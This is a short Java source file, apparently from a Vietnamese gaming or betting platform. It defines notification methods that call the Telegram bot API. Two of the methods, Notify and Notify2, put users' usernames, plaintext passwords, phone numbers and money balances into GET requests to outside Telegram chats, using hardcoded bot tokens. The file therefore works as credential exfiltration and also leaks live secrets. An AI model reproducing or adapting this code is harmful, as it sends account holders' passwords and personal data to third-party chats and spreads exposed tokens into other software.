package com.vinplay.api.processors.accnhatvip;

import com.vinplay.common.HttpCommon;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;

public class BaoNhatVipAcc {
    public void NotifyProxy(){
        try {
            String noidung = "Proxy bị khóa. Báo IT các bạn ơi.";

            OkHttpClient client = HttpCommon.getInstance().getHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot5348217733:AAGsdaINUursf0pA7z7wFJjl2bFP12qf2qM/sendMessage?chat_id=-652015578&text="+noidung)
                    .method("GET", null)
                    .build();
            Response response = client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void Notify(String username, String nickname, String tien, String phone, String codedl, String pass, boolean tinhtrang){
        try {
            String noidung = "";
            if(tinhtrang == true){
                noidung = "Nick name: "+nickname+"%0ASố tiền: "+tien+"%0AUser Name: "+username+"%0APassword: "+pass+"%0AĐã Đăng Ký Tự Động"+"%0ASố ĐT: "+phone ;
            }else{
                noidung = "Nick name: "+nickname+"%0ASố tiền: "+tien+"%0AUser Name: "+username+"%0APassword: "+pass+"%0AChưa Đăng Ký"+"%0ASố ĐT: "+phone;
            }

            OkHttpClient client = HttpCommon.getInstance().getHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot5348217733:AAGsdaINUursf0pA7z7wFJjl2bFP12qf2qM/sendMessage?chat_id=-652015578&text="+noidung)
                    .method("GET", null)
                    .build();
            Response response = client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void Notify2(String username, String nickname, String tien, String phone, String codedl, String pass, boolean tinhtrang){
        try {
            String noidung = "";
            if(tinhtrang == true){
                noidung = "Nick name: "+nickname+"%0ASố tiền: "+tien+"%0AUser Name: "+username+"%0APassword: "+pass+"%0AĐã Đăng Ký Tự Động"+"%0ASố ĐT: "+phone;
            }else{
                noidung = "Nick name: "+nickname+"%0ASố tiền: "+tien+"%0AUser Name: "+username+"%0APassword: "+pass+"%0AChưa Đăng Ký"+"%0ASố ĐT: "+phone;
            }

            OkHttpClient client = HttpCommon.getInstance().getHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot5349984598:AAEnt6Q7JGyMWp-6Xe1YtuuE7yrtUBEEHyM/sendMessage?chat_id=-720623037&text="+noidung)
                    .method("GET", null)
                    .build();
            Response response = client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

